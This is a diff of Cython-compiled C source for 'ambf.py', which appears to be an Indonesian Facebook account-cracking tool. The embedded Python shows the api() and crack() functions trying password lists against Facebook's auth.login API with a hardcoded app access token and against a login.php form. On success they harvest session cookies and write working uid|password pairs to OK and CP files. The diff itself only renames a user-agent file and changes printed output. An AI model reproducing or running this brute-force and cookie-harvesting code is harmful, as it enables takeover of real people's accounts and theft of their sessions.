@@ -835,7 +835,7 @@ struct __pyx_obj_4ambf___pyx_scope_struct_1_genexpr;
  * 
  * def api(uid, pwx):             # <<<<<<<<<<<<<<
  * 	try:
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  */
 struct __pyx_obj_4ambf___pyx_scope_struct__api {
   PyObject_HEAD
@@ -847,7 +847,7 @@ struct __pyx_obj_4ambf___pyx_scope_struct__api {
  * 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
  * 			if "session_key" in send.text and "EAAA" in send.text:
  * 				kuki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])             # <<<<<<<<<<<<<<
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
  * 				ok.append("%s|%s"%(uid, pw))
  */
 struct __pyx_obj_4ambf___pyx_scope_struct_1_genexpr {
@@ -1659,7 +1659,7 @@ static const char __pyx_k_ss[] = "ss";
 static const char __pyx_k_ta[] = "ta";
 static const char __pyx_k_te[] = "te";
 static const char __pyx_k_tt[] = "tt";
-static const char __pyx_k_ua[] = ".ua";
+static const char __pyx_k_ua[] = "ua";
 static const char __pyx_k_yy[] = "yy";
 static const char __pyx_k_123[] = "123";
 static const char __pyx_k_1_2[] = "?1";
@@ -1763,7 +1763,6 @@ static const char __pyx_k_send[] = "send";
 static const char __pyx_k_test[] = "__test__";
 static const char __pyx_k_text[] = "text";
 static const char __pyx_k_time[] = "time";
-static const char __pyx_k_ua_2[] = "ua";
 static const char __pyx_k_user[] = "user";
 static const char __pyx_k_xnxx[] = "xnxx";
 static const char __pyx_k_year[] = "year";
@@ -1850,7 +1849,7 @@ static const char __pyx_k_submit[] = "submit";
 static const char __pyx_k_system[] = "system";
 static const char __pyx_k_update[] = "update";
 static const char __pyx_k_url_wa[] = "url_wa";
-static const char __pyx_k_0_92m_2[] = "\r  \033[0;92m* --> ";
+static const char __pyx_k_0_92m_2[] = "  \033[0;92m* --> ";
 static const char __pyx_k_0_93m_2[] = "\r  \033[0;93m* --> ";
 static const char __pyx_k_0_97m_2[] = "\033[0;97m          ";
 static const char __pyx_k_0_97m_3[] = "\033[0;97m";
@@ -1983,6 +1982,7 @@ static const char __pyx_k_sec_fetch_dest[] = "sec-fetch-dest";
 static const char __pyx_k_sec_fetch_mode[] = "sec-fetch-mode";
 static const char __pyx_k_sec_fetch_site[] = "sec-fetch-site";
 static const char __pyx_k_sec_fetch_user[] = "sec-fetch-user";
+static const char __pyx_k_useragent__txt[] = "useragent_.txt";
 static const char __pyx_k_ConnectionError[] = "ConnectionError";
 static const char __pyx_k_accept_encoding[] = "accept-encoding";
 static const char __pyx_k_accept_language[] = "accept-language";
@@ -2491,6 +2491,7 @@ static PyObject *__pyx_n_s_lower;
 static PyObject *__pyx_n_u_lsd;
 static PyObject *__pyx_n_u_m_ts;
 static PyObject *__pyx_n_s_main;
+static PyObject *__pyx_n_u_main;
 static PyObject *__pyx_n_s_main_2;
 static PyObject *__pyx_n_s_make;
 static PyObject *__pyx_kp_u_mark_via_gp;
@@ -2656,8 +2657,7 @@ static PyObject *__pyx_n_s_ttl;
 static PyObject *__pyx_kp_u_tunggu_sebentar;
 static PyObject *__pyx_kp_u_tutorial_cara_mendapatkan_token;
 static PyObject *__pyx_kp_u_txt;
-static PyObject *__pyx_kp_u_ua;
-static PyObject *__pyx_n_s_ua_2;
+static PyObject *__pyx_n_s_ua;
 static PyObject *__pyx_n_s_uid;
 static PyObject *__pyx_n_u_unrecognized_tries;
 static PyObject *__pyx_n_s_update;
@@ -2670,6 +2670,7 @@ static PyObject *__pyx_kp_u_user_agent;
 static PyObject *__pyx_kp_u_user_agent_2;
 static PyObject *__pyx_kp_u_user_agent_s;
 static PyObject *__pyx_kp_u_user_aktif_selamat_datang_0_93m;
+static PyObject *__pyx_kp_u_useragent__txt;
 static PyObject *__pyx_n_s_value;
 static PyObject *__pyx_n_u_value;
 static PyObject *__pyx_n_u_w;
@@ -16124,7 +16125,7 @@ static PyObject *__pyx_pf_4ambf_22method(CYTHON_UNUSED PyObject *__pyx_self) {
  * 
  * def api(uid, pwx):             # <<<<<<<<<<<<<<
  * 	try:
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  */
 
 /* Python wrapper */
@@ -16197,7 +16198,7 @@ static PyObject *__pyx_gb_4ambf_3api_2generator(__pyx_CoroutineObject *__pyx_gen
  * 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
  * 			if "session_key" in send.text and "EAAA" in send.text:
  * 				kuki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])             # <<<<<<<<<<<<<<
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
  * 				ok.append("%s|%s"%(uid, pw))
  */
 
@@ -16369,7 +16370,7 @@ static PyObject *__pyx_gb_4ambf_3api_2generator(__pyx_CoroutineObject *__pyx_gen
  * 
  * def api(uid, pwx):             # <<<<<<<<<<<<<<
  * 	try:
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  */
 
 static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_pwx) {
@@ -16433,7 +16434,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 
  * def api(uid, pwx):
  * 	try:             # <<<<<<<<<<<<<<
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  * 	except IOError:
  */
   {
@@ -16448,7 +16449,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
       /* "ambf.py":504
  * def api(uid, pwx):
  * 	try:
- * 		ua = open(".ua", "r").read()             # <<<<<<<<<<<<<<
+ * 		ua = open("useragent_.txt", "r").read()             # <<<<<<<<<<<<<<
  * 	except IOError:
  * 		ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
  */
@@ -16479,7 +16480,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 
  * def api(uid, pwx):
  * 	try:             # <<<<<<<<<<<<<<
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  * 	except IOError:
  */
     }
@@ -16494,7 +16495,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
 
     /* "ambf.py":505
  * 	try:
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  * 	except IOError:             # <<<<<<<<<<<<<<
  * 		ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
  * 	global ok, cp, loop, token
@@ -16508,7 +16509,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
       __Pyx_GOTREF(__pyx_t_5);
 
       /* "ambf.py":506
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  * 	except IOError:
  * 		ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")             # <<<<<<<<<<<<<<
  * 	global ok, cp, loop, token
@@ -16528,7 +16529,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 
  * def api(uid, pwx):
  * 	try:             # <<<<<<<<<<<<<<
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  * 	except IOError:
  */
     __Pyx_XGIVEREF(__pyx_t_1);
@@ -16911,7 +16912,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
  * 			if "session_key" in send.text and "EAAA" in send.text:             # <<<<<<<<<<<<<<
  * 				kuki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
  */
         __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_send, __pyx_n_s_text); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 517, __pyx_L13_error)
         __Pyx_GOTREF(__pyx_t_11);
@@ -16936,7 +16937,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
  * 			if "session_key" in send.text and "EAAA" in send.text:
  * 				kuki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])             # <<<<<<<<<<<<<<
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
  * 				ok.append("%s|%s"%(uid, pw))
  */
           __pyx_t_11 = __pyx_pf_4ambf_3api_genexpr(((PyObject*)__pyx_cur_scope)); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 518, __pyx_L13_error)
@@ -16953,7 +16954,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
           /* "ambf.py":519
  * 			if "session_key" in send.text and "EAAA" in send.text:
  * 				kuki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))             # <<<<<<<<<<<<<<
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))             # <<<<<<<<<<<<<<
  * 				ok.append("%s|%s"%(uid, pw))
  * 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
  */
@@ -16962,7 +16963,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
           __pyx_t_12 = 0;
           __pyx_t_9 = 127;
           __Pyx_INCREF(__pyx_kp_u_0_92m_2);
-          __pyx_t_12 += 16;
+          __pyx_t_12 += 15;
           __Pyx_GIVEREF(__pyx_kp_u_0_92m_2);
           PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_kp_u_0_92m_2);
           __pyx_t_4 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_v_uid), __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 519, __pyx_L13_error)
@@ -16997,7 +16998,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
 
           /* "ambf.py":520
  * 				kuki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
  * 				ok.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
  * 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
  * 				break
@@ -17034,7 +17035,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
           __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
 
           /* "ambf.py":521
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
  * 				ok.append("%s|%s"%(uid, pw))
  * 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
  * 				break
@@ -17124,7 +17125,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
  * 			if "session_key" in send.text and "EAAA" in send.text:             # <<<<<<<<<<<<<<
  * 				kuki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
  */
         }
 
@@ -18084,7 +18085,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
  * 				break             # <<<<<<<<<<<<<<
  * 			else:
- * 				print("\r  \033[0;93m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				continue
  */
           goto __pyx_L18_try_break;
 
@@ -18100,48 +18101,12 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
         /* "ambf.py":544
  * 				break
  * 			else:
- * 				print("\r  \033[0;93m* --> %s|%s\033[0;97m          "%(uid, pw))             # <<<<<<<<<<<<<<
+ * 				continue             # <<<<<<<<<<<<<<
  * 		except requests.exceptions.ConnectionError:
  * 			passx = [pw]
  */
         /*else*/ {
-          __pyx_t_6 = PyTuple_New(5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 544, __pyx_L13_error)
-          __Pyx_GOTREF(__pyx_t_6);
-          __pyx_t_12 = 0;
-          __pyx_t_9 = 127;
-          __Pyx_INCREF(__pyx_kp_u_0_93m_2);
-          __pyx_t_12 += 16;
-          __Pyx_GIVEREF(__pyx_kp_u_0_93m_2);
-          PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_0_93m_2);
-          __pyx_t_11 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_v_uid), __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 544, __pyx_L13_error)
-          __Pyx_GOTREF(__pyx_t_11);
-          __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_9;
-          __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
-          __Pyx_GIVEREF(__pyx_t_11);
-          PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_11);
-          __pyx_t_11 = 0;
-          __Pyx_INCREF(__pyx_kp_u__97);
-          __pyx_t_12 += 1;
-          __Pyx_GIVEREF(__pyx_kp_u__97);
-          PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u__97);
-          __pyx_t_11 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_v_pw), __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 544, __pyx_L13_error)
-          __Pyx_GOTREF(__pyx_t_11);
-          __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_9;
-          __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
-          __Pyx_GIVEREF(__pyx_t_11);
-          PyTuple_SET_ITEM(__pyx_t_6, 3, __pyx_t_11);
-          __pyx_t_11 = 0;
-          __Pyx_INCREF(__pyx_kp_u_0_97m_2);
-          __pyx_t_12 += 17;
-          __Pyx_GIVEREF(__pyx_kp_u_0_97m_2);
-          PyTuple_SET_ITEM(__pyx_t_6, 4, __pyx_kp_u_0_97m_2);
-          __pyx_t_11 = __Pyx_PyUnicode_Join(__pyx_t_6, 5, __pyx_t_12, __pyx_t_9); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 544, __pyx_L13_error)
-          __Pyx_GOTREF(__pyx_t_11);
-          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-          __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_11); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 544, __pyx_L13_error)
-          __Pyx_GOTREF(__pyx_t_6);
-          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+          goto __pyx_L19_try_continue;
         }
 
         /* "ambf.py":512
@@ -18152,10 +18117,6 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 			ses = requests.Session()
  */
       }
-      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
-      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
-      goto __pyx_L20_try_end;
       __pyx_L13_error:;
       __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
       __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
@@ -18166,7 +18127,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
 
       /* "ambf.py":545
  * 			else:
- * 				print("\r  \033[0;93m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				continue
  * 		except requests.exceptions.ConnectionError:             # <<<<<<<<<<<<<<
  * 			passx = [pw]
  * 			api(uid, passx)
@@ -18192,7 +18153,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
         __Pyx_GOTREF(__pyx_t_6);
 
         /* "ambf.py":546
- * 				print("\r  \033[0;93m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				continue
  * 		except requests.exceptions.ConnectionError:
  * 			passx = [pw]             # <<<<<<<<<<<<<<
  * 			api(uid, passx)
@@ -18302,12 +18263,17 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
       __Pyx_XGIVEREF(__pyx_t_1);
       __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
       goto __pyx_L12_break;
+      __pyx_L19_try_continue:;
+      __Pyx_XGIVEREF(__pyx_t_3);
+      __Pyx_XGIVEREF(__pyx_t_2);
+      __Pyx_XGIVEREF(__pyx_t_1);
+      __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
+      goto __pyx_L11_continue;
       __pyx_L14_exception_handled:;
       __Pyx_XGIVEREF(__pyx_t_3);
       __Pyx_XGIVEREF(__pyx_t_2);
       __Pyx_XGIVEREF(__pyx_t_1);
       __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
-      __pyx_L20_try_end:;
     }
 
     /* "ambf.py":511
@@ -18317,6 +18283,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 		try:
  * 			pw = pw.lower()
  */
+    __pyx_L11_continue:;
   }
   __pyx_L12_break:;
   __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
@@ -18341,7 +18308,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 
  * def api(uid, pwx):             # <<<<<<<<<<<<<<
  * 	try:
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  */
 
   /* function exit code */
@@ -18381,7 +18348,7 @@ static PyObject *__pyx_pf_4ambf_24api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 
  * def crack(uid, pwx, host):             # <<<<<<<<<<<<<<
  * 	try:
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  */
 
 /* Python wrapper */
@@ -18516,7 +18483,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
  * 
  * def crack(uid, pwx, host):
  * 	try:             # <<<<<<<<<<<<<<
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  * 	except IOError:
  */
   {
@@ -18531,7 +18498,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
       /* "ambf.py":554
  * def crack(uid, pwx, host):
  * 	try:
- * 		ua = open(".ua", "r").read()             # <<<<<<<<<<<<<<
+ * 		ua = open("useragent_.txt", "r").read()             # <<<<<<<<<<<<<<
  * 	except IOError:
  * 		ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
  */
@@ -18562,7 +18529,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
  * 
  * def crack(uid, pwx, host):
  * 	try:             # <<<<<<<<<<<<<<
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  * 	except IOError:
  */
     }
@@ -18577,7 +18544,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
 
     /* "ambf.py":555
  * 	try:
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  * 	except IOError:             # <<<<<<<<<<<<<<
  * 		ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
  * 	global ok, cp, loop, token
@@ -18591,7 +18558,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
       __Pyx_GOTREF(__pyx_t_5);
 
       /* "ambf.py":556
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  * 	except IOError:
  * 		ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")             # <<<<<<<<<<<<<<
  * 	global ok, cp, loop, token
@@ -18611,7 +18578,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
  * 
  * def crack(uid, pwx, host):
  * 	try:             # <<<<<<<<<<<<<<
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  * 	except IOError:
  */
     __Pyx_XGIVEREF(__pyx_t_1);
@@ -19053,7 +19020,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
  * 			b = ses.post(host+"/login.php", data={"email": uid, "pass": pw, "login": "submit"})
  * 			if "c_user" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
  * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
  */
         __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 568, __pyx_L13_error)
         __Pyx_GOTREF(__pyx_t_4);
@@ -19102,7 +19069,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
  * 			b = ses.post(host+"/login.php", data={"email": uid, "pass": pw, "login": "submit"})
  * 			if "c_user" in ses.cookies.get_dict().keys():
  * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])             # <<<<<<<<<<<<<<
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
  * 				ok.append("%s|%s"%(uid, pw))
  */
           { /* enter inner scope */
@@ -19196,7 +19163,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
           /* "ambf.py":570
  * 			if "c_user" in ses.cookies.get_dict().keys():
  * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))             # <<<<<<<<<<<<<<
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))             # <<<<<<<<<<<<<<
  * 				ok.append("%s|%s"%(uid, pw))
  * 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
  */
@@ -19205,7 +19172,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
           __pyx_t_19 = 0;
           __pyx_t_9 = 127;
           __Pyx_INCREF(__pyx_kp_u_0_92m_2);
-          __pyx_t_19 += 16;
+          __pyx_t_19 += 15;
           __Pyx_GIVEREF(__pyx_kp_u_0_92m_2);
           PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_0_92m_2);
           __pyx_t_14 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_v_uid), __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 570, __pyx_L13_error)
@@ -19240,7 +19207,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
 
           /* "ambf.py":571
